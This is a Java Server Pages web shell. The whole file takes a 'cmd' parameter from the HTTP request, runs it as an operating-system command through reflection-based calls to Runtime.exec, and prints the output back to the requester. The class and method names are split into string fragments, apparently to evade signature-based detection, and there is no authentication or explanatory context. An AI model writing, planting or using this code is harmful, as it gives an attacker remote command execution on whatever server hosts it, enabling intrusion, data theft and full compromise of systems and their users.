<%@ page language="java" pageEncoding="UTF-8" %>
<%
    // advance
    String cmd = request.getParameter("cmd");
    String name = "java.lang."+"Runtime";
    Class rt = Class.forName(name);
    String runtime = "getRu"+"ntime";
    java.lang.reflect.Method gr = rt.getMethod(runtime);
    String exec = "ex"+"ec";
    java.lang.reflect.Method ex = rt.getMethod(exec, String.class);
    Object obj = gr.invoke(null);
    Process process = (Process) ex.invoke(obj, cmd);

    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>